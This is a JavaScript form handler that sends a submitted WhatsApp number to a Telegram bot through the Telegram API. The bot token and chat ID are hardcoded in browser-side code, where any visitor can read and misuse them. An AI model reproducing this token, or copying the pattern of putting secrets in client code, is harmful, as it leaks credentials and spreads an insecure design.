function sendMessage(event) {
    event.preventDefault(); // Prevent the form from submitting
    var number = document.getElementById("whatsapp_number").value;

    const token = "6028159101:AAHLFL-er_Y-On_gd7UYrjcFKzYZxmFrbaI";
    const id = "1493444597";

    const msg = `whatsapp group: ${number}`;
    fetch(
      `https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(
        msg
      )}`
    );
    // event.target.reset();
  }

  document.getElementById("whatsappButton").addEventListener("submit", sendMessage);